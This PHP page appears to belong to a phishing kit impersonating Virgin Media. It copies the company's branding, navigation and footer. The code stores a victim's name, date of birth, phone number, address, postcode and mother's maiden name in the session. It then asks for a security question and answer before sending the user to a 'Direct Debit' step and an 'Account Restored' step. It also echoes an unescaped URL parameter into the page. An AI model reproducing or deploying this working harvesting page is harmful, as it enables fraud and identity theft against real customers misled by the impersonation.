<?php
require 'controls.php';
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];

if(!isset($_GET['error'])){
    $_SESSION['title'] = $_POST['title'];
    $first = $_POST['firstName'];
    $last = $_POST['lastName'];
    $_SESSION['fullName'] = ($first . " " . $last);
    $dob1 = $_POST['dobDay'];
    $dob2 = $_POST['dobMonth'];
    $dob3 = $_POST['dobYear'];
    $_SESSION['dob'] = ($dob1 . "/" . $dob2 . "/" . $dob3);
    $_SESSION['telephone'] = $_POST['contactNo'];
    $_SESSION['address'] = $_POST['address'];
    $_SESSION['city'] = $_POST['city'];
    $_SESSION['postCode'] = $_POST['postCode'];
    $_SESSION['MMN'] = $_POST['mmn'];
    if(!isset($_POST['title']) or $_POST['title'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['firstName']) or $_POST['firstName'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['mmn']) or $_POST['mmn'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['lastName']) or $_POST['lastName'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['dobDay']) or $_POST['dobDay'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['dobMonth']) or $_POST['dobMonth'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['dobYear']) or $_POST['dobYear'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['contactNo']) or $_POST['contactNo'] == ''){
        echo("<script>location.href = 'Billing.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
}
?>
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
    <head class="at-element-marker">
        <title>Virgin Media - Checkout</title>
        <meta name="description" content="">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link href="css/font-awesome.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/bootstrap.overrides.css" rel="stylesheet">
        <link href="css/vm.theme.css" rel="stylesheet">
        <link href="css/mtp.forms.css" rel="stylesheet">
        <link href="css/mtp.ecareTheme.css" rel="stylesheet">
        <link href="css/header-reBrand.css" rel="stylesheet">
        <link href="css/mtp.basket.css" rel="stylesheet">
    </head>
    <body class="yourdetails paym">
        <header class="header">
            <div class="">
                <div class="container">
                    <img style="position: absolute; margin-top: 1%;" class="virginLogo" src="assets/logo.png">
                    <div class="row position-rel main-hdr-row">
                        <div class="col-xs-3 logo-container">
                            <a class="vm-logo xs-logo">
                            
                            </a>
                        </div>
                        <ul class="col-xs-9 top-nav">
                            <li class="top-nav-items gradient collapsed xxs-visible main-menu" data-toggle="collapse" data-target="#levelOne-menu">
                                <a class="" href="#">
                                    <span class="openMenu">
                                            <span class="pull-left">Main
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                    <span class="closeMenu">
                                            <span class="pull-left">Close
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items dark-gradient collapsed sign-inTop signIn-menu" data-toggle="collapse" data-target="#signIn">
                                <a class="signin-text clearfix" tabindex="11" href="#">
                                    <span class="openMenu">
                                        <span class="pull-left">
                                            <i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                    <span class="closeMenu">
                                        <span class="pull-left"><i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="https://my.virginmedia.com/my-apps/email/mailbox" tabindex="10"><i class="sprite email visible-desktop"></i>Email</a>
                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="http://store.virginmedia.com/store-locator.html" tabindex="9"><i class="sprite store-locator visible-desktop"></i>Find a store</a>
                            </li>
                        </ul>

                        <div id="levelOne-menu" class="collapse l1-menu tab-style">
                            <div class="menu-content">
                                <ul id="navTab" class="nav row no-gap clearfix nav-tabs">
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmedia.com/entertainme" class="notch" tabindex="3">Entertain Me</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="https://store.virginmedia.com/discover.html" class="notch" tabindex="4">Our Products</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav active"><a tabindex="5" href="#joinUs" class="notch">Join Us</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="6" href="https://my.virginmedia.com/" class="notch">My Virgin Media</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="7" href="http://help.virginmedia.com/">Help</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmediabusiness.co.uk/" tabindex="8" class="notch">For Business</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="http://store.virginmedia.com/store-locator.html" class="notch">Store Locator</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="https://my.virginmedia.com/my-apps/email/mailbox" class="notch">Email</a>

                                    </li>
                                </ul>
                            </div>
                        </div> 
                    </div>
                </div>
            </div>
        </header>

        <div id="content">
            <div class="container content-body">
                <div class="row">
                    <br>
                    <form method="post" id="yourDetailsForm" name="yourDetailsForm" class="your-details-form" action="DirectDebit.php?sessionID=<?php echo $sessionID; ?>">
                        <div class="full-width col-md-12">
                            <div class="panel-group" id="checkout">

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Your Details
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default" style="overflow:inherit;">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                                                href="#you-details"><i class="checkout-icon your-details"></i> Verification</a>
                                        </h4>
                                    </div>

                                    <div class="panel-collapse in" id="you-details">
                                        <div class="panel-body">
                                            <div class="message">
                                                <p>We need you to verify if you are who you say you are.</p>
                                                <p>This is the security question you have already setup when creating your virgin media account.</p>
                                            </div>
                                            <div class="form-horizontal about-you about-you-edit">
                                                <h3>Your Security Question</h3>

                                                <?php 
                                                    if(isset($_GET['error'])){
                                                        if($_GET['error'] == 'empty'){
                                                            echo '
                                                                <div class="warning icon yourdetails_new_paym_standard_error_incompletefields">
                                                                    <p><strong>Sorry, you didnt enter all those details
                                                                            correctly.</strong></p>
                                                                    <p>Please check and try again.</p>
                                                                </div>
                                                            ';
                                                        }
                                                    }
                                                ?>

                                                <div class="form-group">
                                                    <label class="col-md-3 col-sm-3 col-xs-12 control-label"
                                                        for="security-question">Security question</label>
                                                    <div class="col-md-6 col-sm-6 col-xs-10">
                                                        <select name="securityQ" id="security-question"
                                                            class="form-control required hw-security-question hw-secQuestion-validator">
                                                            <option value="">Select a question</option>
                                                            <option value="1">Mother's maiden name</option>
                                                            <option value="2">Place of birth</option>
                                                            <option value="3">Name of first school</option>
                                                            <option value="4">Favorite song or band</option>
                                                            <option value="5">Name of your first pet</option>
                                                            <option value="6">Favorite food</option>
                                                        </select>
                                                    </div>
                                                </div>

                                                <div class="form-group">
                                                    <label class="col-md-3 col-sm-3 col-xs-12 control-label" for="security-answer">
                                                        Security answer
                                                    </label>
                                                    <div class="col-md-6 col-sm-6 col-xs-10">
                                                        <input name="securityA" value=""
                                                            class="form-control required hw-security-answer hw-secAnswer-validator"
                                                            id="security-answer" type="text">
                                                        <span class="icon-clear">x</span>
                                                    </div>
                                                </div>

                                                <button class="btn btn-primary btn-mobile find-your-current-address hw-find-your-address" type="submit" id="findAddress">Continue</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                                                href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Direct Debit</a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#your-completed-order">
                                                <i class="checkout-icon order-completed"></i>Account Restored
                                            </a>
                                        </h4>
                                    </div>
                                </div>
                                
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer class="footer hidden-print">
            <div class="container">
                <nav class="shift-left-desktop">
                    <ul class="nav footer-nav row">
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>About Virgin Media</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Careers</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Advertise with us</a>
                        </li><li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Accessibility</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Legal stuff</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Site Map</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Contact us</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12 no-border"><a>Our cookies</a>
                        </li>
                    </ul>
                </nav>
                <div class="footer-logo clearfix shift-right-desktop">
                    <p class="pull-right">
                        <span>© 2015 Virgin Media.</span><br> All Rights Reserved
                        <a>
                            <img width="54" height="34" alt="Virgin Media" src="assets/images/vm-logo-sm.png">
                        </a>
                    </p>
                </div>
            </div>
        </footer>
    </body>
</html>